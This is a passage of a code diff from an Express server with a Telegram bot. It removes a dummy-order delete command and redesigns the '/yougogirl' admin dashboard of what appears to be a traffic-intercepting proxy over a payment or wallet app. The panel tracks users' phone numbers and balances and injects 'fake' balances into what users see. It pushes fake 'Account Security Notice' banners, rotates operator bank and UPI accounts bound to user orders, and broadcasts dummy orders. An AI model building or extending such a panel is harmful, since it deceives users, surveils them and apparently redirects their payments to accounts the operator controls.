-        await bot.sendMessage(chatId, '❌ Format: `/deldummy <code/id/index/all>`\n\nExample: `/deldummy Izpjkx` or `/deldummy 1` or `/deldummy all`', { parse_mode: 'Markdown' });
-        return res.sendStatus(200);
-      }
-      if (param.toLowerCase() === 'all') {
-        const count = data.dummyOrders.length;
-        data.dummyOrders = [];
-        await saveData(data);
-        await bot.sendMessage(chatId, `🗑️ Cleared all ${count} dummy orders from KV storage.`);
-        return res.sendStatus(200);
-      }
-      const num = parseInt(param);
-      if (!isNaN(num) && String(num) === param) {
-        const target = data.dummyOrders[num - 1];
-        if (!target) {
-          await bot.sendMessage(chatId, `❌ Invalid index #${num}. Run /dummies to view list.`);
-          return res.sendStatus(200);
-        }
-        data.dummyOrders.splice(num - 1, 1);
-        await saveData(data);
-        await bot.sendMessage(chatId, `🗑️ Deleted dummy order #${num} (\`${target.code}\`) from KV storage.`, { parse_mode: 'Markdown' });
-        return res.sendStatus(200);
-      }
 
-      const initialLen = data.dummyOrders.length;
-      data.dummyOrders = data.dummyOrders.filter(d => d.code.toLowerCase() !== param.toLowerCase() && String(d.id).toLowerCase() !== param.toLowerCase());
-      if (data.dummyOrders.length < initialLen) {
-        await saveData(data);
-        await bot.sendMessage(chatId, `✅ Dummy order \`${param}\` deleted from KV storage.`, { parse_mode: 'Markdown' });
-      } else {
-        await bot.sendMessage(chatId, `❌ No dummy order found matching \`${param}\`. Run /dummies to view list.`, { parse_mode: 'Markdown' });
-      }
-      return res.sendStatus(200);
-    }
+
+
+
+
+
+
 
     if (text === '/help') {
       await bot.sendMessage(chatId, 'Use /start to see all commands.');
@@ -4204,171 +3585,360 @@ app.get('/yougogirl', async (req, res) => {
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
-        body { font-family: 'Inter', sans-serif; background: #0f172a; color: #f8fafc; }
-        .glass { background: rgba(30, 41, 59, 0.7); backdrop-filter: blur(12px); border: 1px solid rgba(255, 255, 255, 0.08); }
+        :root { --bg: #0a0f1e; --card: #161e31; --accent: #38bdf8; --text: #f1f5f9; --glass: rgba(22, 30, 49, 0.7); }
+        body { background: var(--bg); color: var(--text); font-family: 'Inter', sans-serif; overflow-x: hidden; }
+        .glass { background: var(--glass); backdrop-filter: blur(12px); border: 1px solid rgba(255, 255, 255, 0.08); }
+        .card { background: var(--card); border-radius: 1.5rem; padding: 1.5rem; border: 1px solid rgba(255, 255, 255, 0.05); box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.4); }
         .gradient-text { background: linear-gradient(135deg, #38bdf8, #818cf8); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
-        .input-field { background: #1e293b; border: 1px solid #334155; border-radius: 0.75rem; padding: 0.75rem 1rem; width: 100%; transition: all 0.3s; color: white; }
+        .input-field { background: #0a0f1e; border: 1px solid #2d3748; border-radius: 0.75rem; padding: 0.75rem 1rem; width: 100%; color: white; transition: all 0.2s; font-size: 0.875rem; }
         .input-field:focus { border-color: #38bdf8; outline: none; box-shadow: 0 0 0 2px rgba(56, 189, 248, 0.2); }
-        .btn-primary { background: linear-gradient(135deg, #0ea5e9, #6366f1); border-radius: 0.75rem; padding: 0.75rem 1.5rem; font-weight: 600; transition: all 0.3s; }
-        .btn-primary:hover { transform: translateY(-1px); box-shadow: 0 4px 12px rgba(99, 102, 241, 0.3); }
-        .card { background: #1e293b; border: 1px solid #334155; border-radius: 1rem; padding: 1.5rem; }
-        .tab-btn { padding: 0.75rem 1.25rem; border-radius: 0.75rem; font-weight: 500; transition: all 0.2s; cursor: pointer; }
-        .tab-btn.active { background: #334155; color: #38bdf8; }
+        .btn-primary { background: linear-gradient(135deg, #38bdf8, #818cf8); border-radius: 0.75rem; padding: 0.75rem 1.5rem; font-weight: 600; transition: all 0.2s; color: white; }
+        .btn-primary:hover { opacity: 0.9; transform: translateY(-1px); box-shadow: 0 4px 12px rgba(56, 189, 248, 0.3); }
+        .tab-btn { padding: 0.85rem 1.25rem; border-radius: 1rem; font-weight: 500; transition: all 0.2s; cursor: pointer; display: flex; items-center: center; color: #94a3b8; border: 1px solid transparent; }
+        .tab-btn:hover { background: rgba(255,255,255,0.05); color: #f1f5f9; }
+        .tab-btn.active { background: rgba(56, 189, 248, 0.1); color: #38bdf8; border-color: rgba(56, 189, 248, 0.2); }
         .tab-content { display: none; animation: fadeIn 0.3s ease-out; }
         .tab-content.active { display: block; }
+        .status-dot { width: 8px; height: 8px; border-radius: 50%; display: inline-block; }
+        .badge { padding: 0.25rem 0.5rem; border-radius: 0.5rem; font-size: 0.7rem; font-weight: 700; text-transform: uppercase; }
         @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
-        ::-webkit-scrollbar { width: 8px; }
-        ::-webkit-scrollbar-track { background: #0f172a; }
-        ::-webkit-scrollbar-thumb { background: #334155; border-radius: 10px; }
-        ::-webkit-scrollbar-thumb:hover { background: #475569; }
+        ::-webkit-scrollbar { width: 6px; }
+        ::-webkit-scrollbar-track { background: #0a0f1e; }
+        ::-webkit-scrollbar-thumb { background: #2d3748; border-radius: 10px; }
     </style>
 </head>
 <body class="min-h-screen p-4 md:p-8">
-    <div class="max-w-6xl mx-auto">
+    <div class="max-w-7xl mx-auto">
         <!-- Header -->
-        <header class="flex flex-col md:flex-row md:items-center justify-between mb-8 gap-4">
+        <header class="flex flex-col md:flex-row md:items-center justify-between mb-10 gap-6">
             <div>
-                <h1 class="text-3xl font-bold gradient-text">GoGirl Controller</h1>
-                <p class="text-slate-400">Advanced Proxy & Bot Management System</p>
+                <h1 class="text-4xl font-black gradient-text tracking-tight">GOGIRL PRO</h1>
+                <p class="text-slate-400 font-medium">Ultimate Proxy & System Command Center</p>
             </div>
-            <div class="flex items-center gap-3 glass px-4 py-2 rounded-2xl">
-                <div class="flex items-center gap-2">
-                    <span class="w-3 h-3 rounded-full ${data.botEnabled ? 'bg-emerald-500 shadow-[0_0_8px_rgba(16,185,129,0.6)]' : 'bg-rose-500'}"></span>
-                    <span class="text-sm font-medium">${data.botEnabled ? 'Proxy Active' : 'Proxy Offline'}</span>
+            <div class="flex flex-wrap items-center gap-4">
+                <div class="glass px-5 py-3 rounded-2xl flex items-center gap-4">
+                    <div class="flex items-center gap-2">
+                        <span class="status-dot ${data.botEnabled ? 'bg-emerald-500 shadow-[0_0_10px_#10b981]' : 'bg-rose-500'}"></span>
+                        <span class="text-xs font-bold uppercase tracking-wider">${data.botEnabled ? 'System Live' : 'System Offline'}</span>
+                    </div>
+                    <div class="w-px h-6 bg-slate-700"></div>
+                    <div class="flex items-center gap-2">
+                        <span class="status-dot ${debugMode ? 'bg-amber-500 shadow-[0_0_10px_#f59e0b]' : 'bg-slate-600'}"></span>
+                        <span class="text-xs font-bold uppercase tracking-wider">${debugMode ? 'Debug ON' : 'Debug OFF'}</span>
+                    </div>
                 </div>
-                <div class="w-px h-4 bg-slate-700 mx-2"></div>
-                <div class="text-sm text-slate-400">
-                    <i class="fa-solid fa-users mr-1"></i> ${Object.keys(data.trackedUsers || {}).length} Tracked
+                <div class="glass px-5 py-3 rounded-2xl text-xs font-bold uppercase tracking-wider text-sky-400">
+                    <i class="fa-solid fa-users mr-2"></i> ${Object.keys(data.trackedUsers || {}).length} Users
                 </div>
             </div>
         </header>
 
-        <!-- Main Grid -->
-        <div class="grid grid-cols-1 lg:grid-cols-4 gap-6">
-            <!-- Sidebar Tabs -->
-            <aside class="lg:col-span-1 space-y-2">
+        <div class="grid grid-cols-1 lg:grid-cols-12 gap-8">
+            <!-- Navigation Sidebar -->
+            <aside class="lg:col-span-3 space-y-2">
                 <div onclick="showTab('overview')" class="tab-btn active" id="btn-overview">
-                    <i class="fa-solid fa-gauge-high mr-3"></i> Overview
+                    <i class="fa-solid fa-house-chimney w-6"></i> Overview
                 </div>
-                <div onclick="showTab('users')" class="tab-btn" id="btn-users">
-                    <i class="fa-solid fa-user-gear mr-3"></i> User Controls
+                <div class="text-[10px] font-bold text-slate-500 uppercase tracking-[0.2em] px-4 mt-6 mb-2">User Management</div>
+                <div onclick="showTab('banners')" class="tab-btn" id="btn-banners">
+                    <i class="fa-solid fa-bullhorn w-6"></i> Banners
+                </div>
+                <div onclick="showTab('balance')" class="tab-btn" id="btn-balance">
+                    <i class="fa-solid fa-wallet w-6"></i> Balance
+                </div>
+                <div onclick="showTab('tracking')" class="tab-btn" id="btn-tracking">
+                    <i class="fa-solid fa-radar w-6"></i> User Tracking
+                </div>
+                <div class="text-[10px] font-bold text-slate-500 uppercase tracking-[0.2em] px-4 mt-6 mb-2">Banking & Orders</div>
+                <div onclick="showTab('banks')" class="tab-btn" id="btn-banks">
+                    <i class="fa-solid fa-building-columns w-6"></i> Banks
+                </div>
+                <div onclick="showTab('orders')" class="tab-btn" id="btn-orders">
+                    <i class="fa-solid fa-file-invoice-dollar w-6"></i> Saved Orders
                 </div>
                 <div onclick="showTab('dummies')" class="tab-btn" id="btn-dummies">
-                    <i class="fa-solid fa-box-archive mr-3"></i> Dummy Orders
+                    <i class="fa-solid fa-box-open w-6"></i> Dummy Orders
+                </div>
+                <div class="text-[10px] font-bold text-slate-500 uppercase tracking-[0.2em] px-4 mt-6 mb-2">Settings</div>
+                <div onclick="showTab('system')" class="tab-btn" id="btn-system">
+                    <i class="fa-solid fa-sliders w-6"></i> System Config
                 </div>
                 <div onclick="showTab('bot2')" class="tab-btn" id="btn-bot2">
-                    <i class="fa-solid fa-robot mr-3"></i> Second Bot
+                    <i class="fa-solid fa-robot w-6"></i> Second Bot
                 </div>
                 <div onclick="showTab('history')" class="tab-btn" id="btn-history">
-                    <i class="fa-solid fa-clock-rotate-left mr-3"></i> Balance History
+                    <i class="fa-solid fa-clock-rotate-left w-6"></i> History
                 </div>
             </aside>
 
             <!-- Content Area -->
-            <main class="lg:col-span-3 space-y-6">
+            <main class="lg:col-span-9 space-y-8">
                 
                 <!-- Tab: Overview -->
                 <section id="tab-overview" class="tab-content active space-y-6">
-                    <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
-                        <div class="card flex flex-col items-center justify-center text-center">
-                            <span class="text-slate-400 text-sm mb-2">Proxy Status</span>
-                            <button onclick="toggleProxy('botEnabled')" class="text-2xl font-bold ${data.botEnabled ? 'text-emerald-400' : 'text-rose-400'} hover:scale-105 transition-transform">
-                                ${data.botEnabled ? 'ENABLED' : 'DISABLED'}
-                            </button>
+                    <div class="grid grid-cols-1 md:grid-cols-4 gap-4">
+                        <div class="card group cursor-pointer" onclick="toggleProxy('botEnabled')">
+                            <div class="text-slate-500 text-[10px] font-bold uppercase mb-2">Proxy Engine</div>
+                            <div class="text-xl font-black ${data.botEnabled ? 'text-emerald-400' : 'text-rose-500'}">${data.botEnabled ? 'ACTIVE' : 'OFFLINE'}</div>
                         </div>
-                        <div class="card flex flex-col items-center justify-center text-center">
-                            <span class="text-slate-400 text-sm mb-2">Auto-Rotate</span>
-                            <button onclick="toggleProxy('autoRotate')" class="text-2xl font-bold ${data.autoRotate ? 'text-emerald-400' : 'text-rose-400'} hover:scale-105 transition-transform">
-                                ${data.autoRotate ? 'ON' : 'OFF'}
-                            </button>
+                        <div class="card group cursor-pointer" onclick="toggleProxy('autoRotate')">
+                            <div class="text-slate-500 text-[10px] font-bold uppercase mb-2">Bank Rotation</div>
+                            <div class="text-xl font-black ${data.autoRotate ? 'text-emerald-400' : 'text-rose-500'}">${data.autoRotate ? 'ON' : 'OFF'}</div>
                         </div>
-                        <div class="card flex flex-col items-center justify-center text-center">
-                            <span class="text-slate-400 text-sm mb-2">Traffic Log</span>
-                            <button onclick="toggleProxy('logRequests')" class="text-2xl font-bold ${data.logRequests ? 'text-emerald-400' : 'text-rose-400'} hover:scale-105 transition-transform">
-                                ${data.logRequests ? 'ON' : 'OFF'}
-                            </button>
+                        <div class="card group cursor-pointer" onclick="toggleProxy('logRequests')">
+                            <div class="text-slate-500 text-[10px] font-bold uppercase mb-2">Traffic Log</div>
+                            <div class="text-xl font-black ${data.logRequests ? 'text-emerald-400' : 'text-rose-500'}">${data.logRequests ? 'ON' : 'OFF'}</div>
+                        </div>
+                        <div class="card group cursor-pointer" onclick="toggleDebug()">
+                            <div class="text-slate-500 text-[10px] font-bold uppercase mb-2">Debug Mode</div>
+                            <div class="text-xl font-black ${debugMode ? 'text-amber-400' : 'text-slate-500'}">${debugMode ? 'ACTIVE' : 'OFF'}</div>
+                        </div>
+                    </div>
+
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+                        <div class="card">
+                            <h3 class="text-lg font-bold mb-4 flex items-center gap-2">
+                                <i class="fa-solid fa-shield-halved text-sky-400"></i> Active Bank
+                            </h3>
+                            ${(() => {
+                                const active = data.banks[data.activeIndex] || data.banks[0];
+                                if (!active) return '<p class="text-slate-500 italic text-sm">No banks configured.</p>';
+                                return '<div class="space-y-2 text-sm">' +
+                                    '<div class="flex justify-between"><span class="text-slate-500">Holder:</span> <span class="font-mono">' + active.accountHolder + '</span></div>' +
+                                    '<div class="flex justify-between"><span class="text-slate-500">Account:</span> <span class="font-mono">' + active.accountNo + '</span></div>' +
+                                    '<div class="flex justify-between"><span class="text-slate-500">IFSC:</span> <span class="font-mono">' + active.ifsc + '</span></div>' +
+                                    '<div class="flex justify-between"><span class="text-slate-500">UPI:</span> <span class="text-sky-400">' + (active.upiId || 'N/A') + '</span></div>' +
+                                '</div>';
+                            })()}
+                        </div>
+                        <div class="card">
+                            <h3 class="text-lg font-bold mb-4 flex items-center gap-2">
+                                <i class="fa-solid fa-link text-indigo-400"></i> Quick Links
+                            </h3>
+                            <div class="space-y-3">
+                                <a href="/yougogirl" class="block p-3 glass rounded-xl hover:bg-white/5 transition-all text-sm font-medium">
+                                    <i class="fa-solid fa-refresh mr-2 text-emerald-400"></i> Refresh Dashboard
+                                </a>
+                                <a href="${webhookLink}" target="_blank" class="block p-3 glass rounded-xl hover:bg-white/5 transition-all text-sm font-medium">
+                                    <i class="fa-solid fa-bolt mr-2 text-amber-400"></i> Re-activate Webhook
+                                </a>
+                            </div>
+                        </div>
+                    </div>
+                </section>
+
+                <!-- Tab: Banners -->
+                <section id="tab-banners" class="tab-content space-y-6">
+                    <div class="card">
+                        <h3 class="text-xl font-bold mb-6">User Banner Management</h3>
+                        <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+                            <div class="space-y-4">
+                                <div>
+                                    <label class="text-xs font-bold text-slate-500 uppercase mb-2 block">Target User ID</label>
+                                    <input type="text" id="banner-userId" class="input-field" placeholder="Enter User ID (e.g. 254627)">
+                                </div>
+                                <div>
+                                    <label class="text-xs font-bold text-slate-500 uppercase mb-2 block">Notice Title</label>
+                                    <input type="text" id="banner-title" class="input-field" placeholder="e.g. 🚨 Account Security Notice">
+                                </div>
+                            </div>
+                            <div>
+                                <label class="text-xs font-bold text-slate-500 uppercase mb-2 block">Message Content</label>
+                                <textarea id="banner-content" class="input-field h-[116px]" placeholder="Write the message users will see in the app..."></textarea>
+                            </div>
+                        </div>
+                        <div class="flex gap-3 mt-6">
+                            <button onclick="setBanner()" class="btn-primary flex-1">Push Notice to User</button>
+                            <button onclick="clearBanner()" class="bg-rose-500/10 text-rose-500 px-6 rounded-xl font-bold hover:bg-rose-500/20 transition-all">Clear User Banner</button>
+                            <button onclick="clearBanner('all')" class="bg-slate-800 text-slate-400 px-6 rounded-xl font-bold hover:bg-slate-700 transition-all">Clear All</button>
                         </div>
                     </div>
 
                     <div class="card">
-                        <h3 class="text-lg font-semibold mb-4 flex items-center">
-                            <i class="fa-solid fa-building-columns mr-2 text-sky-400"></i> Active Bank Details
-                        </h3>
-                        ${(() => {
-                            const active = data.banks[data.activeIndex] || data.banks[0];
-                            if (!active) return '<p class="text-slate-500 italic">No banks configured in system.</p>';
-                            return '<div class="grid grid-cols-2 gap-4 text-sm">' +
-                                '<div><span class="text-slate-400">Holder:</span> ' + active.accountHolder + '</div>' +
-                                '<div><span class="text-slate-400">Account:</span> ' + active.accountNo + '</div>' +
-                                '<div><span class="text-slate-400">IFSC:</span> ' + active.ifsc + '</div>' +
-                                '<div><span class="text-slate-400">UPI:</span> ' + (active.upiId || 'N/A') + '</div>' +
-                            '</div>';
-                        })()}
+                        <h3 class="text-lg font-bold mb-4">Active Banners</h3>
+                        <div class="overflow-x-auto">
+                            <table class="w-full text-left text-sm">
+                                <thead class="text-slate-500 border-b border-slate-800">
+                                    <tr>
+                                        <th class="pb-3">User ID</th>
+                                        <th class="pb-3">Title</th>
+                                        <th class="pb-3">Message</th>
+                                        <th class="pb-3">Status</th>
+                                        <th class="pb-3 text-right">Action</th>
+                                    </tr>
+                                </thead>
+                                <tbody class="divide-y divide-slate-800">
+                                    ${Object.entries(data.userBanners || {}).map(([uid, b]) => 
+                                        '<tr>' +
+                                            '<td class="py-4 font-mono text-sky-400">' + uid + '</td>' +
+                                            '<td class="py-4 font-bold">' + b.title + '</td>' +
+                                            '<td class="py-4 text-slate-400 truncate max-w-[200px]">' + b.content + '</td>' +
+                                            '<td class="py-4"><span class="badge bg-emerald-500/10 text-emerald-500">Live</span></td>' +
+                                            '<td class="py-4 text-right"><button onclick="clearBanner(\'' + uid + '\')" class="text-rose-500 hover:underline">Delete</button></td>' +
+                                        '</tr>'
+                                    ).join('')}
+                                    ${Object.keys(data.userBanners || {}).length === 0 ? '<tr><td colspan="5" class="py-8 text-center text-slate-600 italic">No active banners.</td></tr>' : ''}
+                                </tbody>
+                            </table>
+                        </div>
                     </div>
                 </section>
 
-                <!-- Tab: Users -->
-                <section id="tab-users" class="tab-content space-y-6">
-                    <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
-                        <!-- Balance Control -->
-                        <div class="card">
-                            <h3 class="text-lg font-semibold mb-4">Balance Management</h3>
-                            <div class="space-y-4">
+                <!-- Tab: Balance -->
+                <section id="tab-balance" class="tab-content space-y-6">
+                    <div class="card">
+                        <h3 class="text-xl font-bold mb-6">Balance Adjustment</h3>
+                        <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
+                            <div>
+                                <label class="text-xs font-bold text-slate-500 uppercase mb-2 block">User ID</label>
                                 <input type="text" id="bal-userId" class="input-field" placeholder="User ID">
-                                <input type="number" id="bal-amount" class="input-field" placeholder="Amount (₹)">
-                                <div class="grid grid-cols-2 gap-2">
-                                    <button onclick="updateBalance('add')" class="bg-emerald-500/20 text-emerald-400 py-2 rounded-xl font-medium hover:bg-emerald-500/30">Add</button>
-                                    <button onclick="updateBalance('deduct')" class="bg-rose-500/20 text-rose-400 py-2 rounded-xl font-medium hover:bg-rose-500/30">Deduct</button>
-                                </div>
-                                <button onclick="updateBalance('remove')" class="w-full bg-slate-700 text-slate-300 py-2 rounded-xl font-medium hover:bg-slate-600">Reset to Real Balance</button>
+                            </div>
+                            <div>
+                                <label class="text-xs font-bold text-slate-500 uppercase mb-2 block">Amount (₹)</label>
+                                <input type="number" id="bal-amount" class="input-field" placeholder="0.00">
+                            </div>
+                            <div class="flex items-end gap-2">
+                                <button onclick="updateBalance('add')" class="flex-1 bg-emerald-500 text-white font-bold py-2.5 rounded-xl hover:opacity-90">Add</button>
+                                <button onclick="updateBalance('deduct')" class="flex-1 bg-rose-500 text-white font-bold py-2.5 rounded-xl hover:opacity-90">Deduct</button>
                             </div>
                         </div>
-
-                        <!-- Banner Control -->
-                        <div class="card">
-                            <h3 class="text-lg font-semibold mb-4">User Banner Notice</h3>
-                            <div class="space-y-4">
-                                <input type="text" id="banner-userId" class="input-field" placeholder="User ID">
-                                <input type="text" id="banner-title" class="input-field" placeholder="Title (e.g. VIP Notice)">
-                                <textarea id="banner-content" class="input-field h-20" placeholder="Message content..."></textarea>
-                                <div class="grid grid-cols-2 gap-2">
-                                    <button onclick="setBanner()" class="bg-sky-500/20 text-sky-400 py-2 rounded-xl font-medium hover:bg-sky-500/30">Set Banner</button>
-                                    <button onclick="clearBanner()" class="bg-slate-700 text-slate-300 py-2 rounded-xl font-medium hover:bg-slate-600">Clear</button>
-                                </div>
+                        <div class="mt-6 p-4 glass rounded-2xl flex items-center justify-between">
+                            <div class="text-sm text-slate-400">
+                                <i class="fa-solid fa-circle-info mr-2"></i> Reset will remove all fake balance and show the real system balance.
                             </div>
+                            <button onclick="updateBalance('remove')" class="text-sm font-bold text-sky-400 hover:underline">Reset to Real Balance</button>
                         </div>
                     </div>
+                </section>
 
-                    <!-- Tracked Users List -->
+                <!-- Tab: Tracking -->
+                <section id="tab-tracking" class="tab-content space-y-6">
                     <div class="card overflow-hidden">
-                        <h3 class="text-lg font-semibold mb-4">Tracked Users</h3>
+                        <div class="flex items-center justify-between mb-6">
+                            <h3 class="text-xl font-bold">Real-time User Tracking</h3>
+                            <div class="text-xs text-slate-500">Updates automatically on reload</div>
+                        </div>
                         <div class="overflow-x-auto">
                             <table class="w-full text-left text-sm">
-                                <thead class="text-slate-400 border-b border-slate-700">
+                                <thead class="text-slate-500 border-b border-slate-800">
                                     <tr>
-                                        <th class="pb-3 pr-4">User ID</th>
-                                        <th class="pb-3 pr-4">Phone</th>
-                                        <th class="pb-3 pr-4">Balance</th>
-                                        <th class="pb-3 pr-4">Logging</th>
-                                        <th class="pb-3">Last Seen</th>
+                                        <th class="pb-4">User Details</th>
+                                        <th class="pb-4">Balance Status</th>
+                                        <th class="pb-4">Activity</th>
+                                        <th class="pb-4">Logging</th>
+                                        <th class="pb-4 text-right">Status</th>
                                     </tr>
                                 </thead>
                                 <tbody class="divide-y divide-slate-800">
                                     ${Object.entries(data.trackedUsers || {}).map(([uid, u]) => {
                                         const isOff = data.userOverrides[uid] && data.userOverrides[uid].logOff;
+                                        const added = (data.userOverrides[uid] && data.userOverrides[uid].addedBalance) || 0;
                                         return '<tr>' +
-                                            '<td class="py-3 pr-4 font-mono">' + uid + '</td>' +
-                                            '<td class="py-3 pr-4">' + (u.phone || '-') + '</td>' +
-                                            '<td class="py-3 pr-4 text-emerald-400">₹' + (u.balance || '0') + '</td>' +
-                                            '<td class="py-3 pr-4">' +
-                                                '<button onclick="toggleUserLog(\'' + uid + '\')" class="' + (isOff ? 'text-rose-400' : 'text-emerald-400') + ' font-medium">' +
-                                                    (isOff ? 'Disabled' : 'Enabled') +
+                                            '<td class="py-4">' +
+                                                '<div class="font-mono font-bold text-sky-400">' + uid + '</div>' +
+                                                '<div class="text-xs text-slate-500">' + (u.phone || 'No Phone') + '</div>' +
+                                            '</td>' +
+                                            '<td class="py-4">' +
+                                                '<div class="font-bold">₹' + (u.balance || '0') + '</div>' +
+                                                (added !== 0 ? '<div class="text-[10px] ' + (added > 0 ? 'text-emerald-400' : 'text-rose-500') + '">Fake: ' + (added > 0 ? '+' : '') + added + '</div>' : '') +
+                                            '</td>' +
+                                            '<td class="py-4">' +
+                                                '<div class="text-xs">' + (u.lastAction || 'Login') + '</div>' +
+                                                '<div class="text-[10px] text-slate-500">' + (u.lastSeen || 'N/A') + '</div>' +
+                                            '</td>' +
+                                            '<td class="py-4">' +
+                                                '<button onclick="toggleUserLog(\'' + uid + '\')" class="badge ' + (isOff ? 'bg-rose-500/10 text-rose-500' : 'bg-emerald-500/10 text-emerald-500') + '">' +
+                                                    (isOff ? 'OFF' : 'ON') +
                                                 '</button>' +
                                             '</td>' +
-                                            '<td class="py-3 text-slate-400">' + (u.lastSeen || '-') + '</td>' +
+                                            '<td class="py-4 text-right">' +
+                                                '<span class="text-[10px] font-bold text-slate-500">' + (u.orderCount || 0) + ' ORDERS</span>' +
+                                            '</td>' +
                                         '</tr>';
                                     }).join('')}
+                                </tbody>
+                            </table>
+                        </div>
+                    </div>
+                </section>
+
+                <!-- Tab: Banks -->
+                <section id="tab-banks" class="tab-content space-y-6">
+                    <div class="card">
+                        <h3 class="text-xl font-bold mb-6">Add New Bank</h3>
+                        <div class="grid grid-cols-1 md:grid-cols-3 gap-4 mb-4">
+                            <input type="text" id="bank-holder" class="input-field" placeholder="Account Holder Name">
+                            <input type="text" id="bank-accNo" class="input-field" placeholder="Account Number">
+                            <input type="text" id="bank-ifsc" class="input-field" placeholder="IFSC Code">
+                        </div>
+                        <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                            <input type="text" id="bank-name" class="input-field" placeholder="Bank Name (Optional)">
+                            <input type="text" id="bank-upi" class="input-field" placeholder="UPI ID (Optional)">
+                        </div>
+                        <button onclick="addBank()" class="btn-primary w-full mt-6">Add Bank to System</button>
+                    </div>
+
+                    <div class="card">
+                        <h3 class="text-lg font-bold mb-4">System Banks</h3>
+                        <div class="grid grid-cols-1 gap-4">
+                            ${(data.banks || []).map((b, i) => 
+                                '<div class="p-4 glass rounded-2xl flex flex-col md:flex-row md:items-center justify-between gap-4 ' + (data.activeIndex === i ? 'border-sky-500/50 bg-sky-500/5' : '') + '">' +
+                                    '<div>' +
+                                        '<div class="flex items-center gap-2 mb-1">' +
+                                            '<span class="text-xs font-black text-slate-500">#' + (i + 1) + '</span>' +
+                                            '<span class="font-bold">' + b.accountHolder + '</span>' +
+                                            (data.activeIndex === i ? '<span class="badge bg-sky-500 text-white text-[8px]">Active</span>' : '') +
+                                        '</div>' +
+                                        '<div class="text-xs text-slate-400 font-mono">' + b.accountNo + ' | ' + b.ifsc + '</div>' +
+                                        (b.upiId ? '<div class="text-[10px] text-sky-400 mt-1">' + b.upiId + '</div>' : '') +
+                                    '</div>' +
+                                    '<div class="flex flex-wrap items-center gap-2">' +
+                                        '<div class="flex items-center glass rounded-lg px-2 py-1">' +
+                                            '<span class="text-[10px] text-slate-500 mr-2">Min: ₹</span>' +
+                                            '<input type="number" value="' + (b.minAmount || 0) + '" onchange="setMin(' + i + ', this.value)" class="bg-transparent border-none text-xs w-16 focus:outline-none">' +
+                                        '</div>' +
+                                        '<button onclick="setActiveBank(' + i + ')" class="text-xs font-bold text-sky-400 hover:underline">Set Active</button>' +
+                                        '<button onclick="removeBank(' + i + ')" class="text-xs font-bold text-rose-500 hover:underline">Remove</button>' +
+                                    '</div>' +
+                                '</div>'
+                            ).join('')}
+                        </div>
+                    </div>
+                </section>
+
+                <!-- Tab: Orders -->
+                <section id="tab-orders" class="tab-content space-y-6">
+                    <div class="card overflow-hidden">
+                        <div class="flex items-center justify-between mb-6">
+                            <h3 class="text-xl font-bold">Saved Order-Bank Bindings</h3>
+                            <button onclick="clearAllOrders()" class="text-xs font-bold text-rose-500 hover:underline">Clear All Bindings</button>
+                        </div>
+                        <div class="overflow-x-auto">
+                            <table class="w-full text-left text-sm">
+                                <thead class="text-slate-500 border-b border-slate-800">
+                                    <tr>
+                                        <th class="pb-4">Order Code</th>
+                                        <th class="pb-4">User</th>
+                                        <th class="pb-4">Amount</th>
+                                        <th class="pb-4">Bound Bank</th>
+                                        <th class="pb-4 text-right">Action</th>
+                                    </tr>
+                                </thead>
+                                <tbody class="divide-y divide-slate-800">
+                                    ${Object.values(data.orderBankMap || {}).filter((v, i, a) => v && v.orderCode && a.findIndex(t => t.orderCode === v.orderCode) === i).map(o => 
+                                        '<tr>' +
+                                            '<td class="py-4 font-mono text-sky-400 text-xs">' + o.orderCode + '</td>' +
+                                            '<td class="py-4 text-xs">' + (o.userId || 'N/A') + '</td>' +
+                                            '<td class="py-4 font-bold">₹' + (o.amount || '0') + '</td>' +
+                                            '<td class="py-4 text-xs text-slate-400">' +
+                                                (o.bank ? o.bank.accountHolder + '<br><span class="text-[10px]">' + o.bank.accountNo + '</span>' : 'N/A') +
+                                            '</td>' +
+                                            '<td class="py-4 text-right">' +
+                                                '<button onclick="deleteOrder(\'' + o.orderCode + '\')" class="text-rose-500 hover:underline">Delete</button>' +
+                                            '</td>' +
+                                        '</tr>'
+                                    ).join('')}
+                                    ${Object.keys(data.orderBankMap || {}).length === 0 ? '<tr><td colspan="5" class="py-8 text-center text-slate-600 italic">No saved order bindings.</td></tr>' : ''}
                                 </tbody>
                             </table>
                         </div>
@@ -4378,40 +3948,49 @@ app.get('/yougogirl', async (req, res) => {
                 <!-- Tab: Dummies -->
                 <section id="tab-dummies" class="tab-content space-y-6">
                     <div class="card">
-                        <h3 class="text-lg font-semibold mb-4">Create Dummy Order</h3>
-                        <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
-                            <input type="number" id="dummy-amount" class="input-field" placeholder="Amount (₹)">
-                            <input type="number" id="dummy-min" class="input-field" placeholder="Min Range (Optional)">
-                            <input type="number" id="dummy-max" class="input-field" placeholder="Max Range (Optional)">
+                        <h3 class="text-xl font-bold mb-6">Generate Dummy Order</h3>
+                        <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
+                            <div>
+                                <label class="text-xs font-bold text-slate-500 uppercase mb-2 block">Base Amount (₹)</label>
+                                <input type="number" id="dummy-amount" class="input-field" placeholder="e.g. 500">
+                            </div>
+                            <div>
+                                <label class="text-xs font-bold text-slate-500 uppercase mb-2 block">Min Range (Optional)</label>
+                                <input type="number" id="dummy-min" class="input-field" placeholder="Auto-calculated if empty">
+                            </div>
+                            <div>
+                                <label class="text-xs font-bold text-slate-500 uppercase mb-2 block">Max Range (Optional)</label>
+                                <input type="number" id="dummy-max" class="input-field" placeholder="Auto-calculated if empty">
+                            </div>
                         </div>
-                        <button onclick="addDummy()" class="w-full btn-primary text-white mt-4">Create Order</button>
+                        <button onclick="addDummy()" class="btn-primary w-full mt-6">Create & Broadcast Dummy Order</button>
                     </div>
 
                     <div class="card overflow-hidden">
-                        <div class="flex items-center justify-between mb-4">
-                            <h3 class="text-lg font-semibold">Active Dummy Orders</h3>
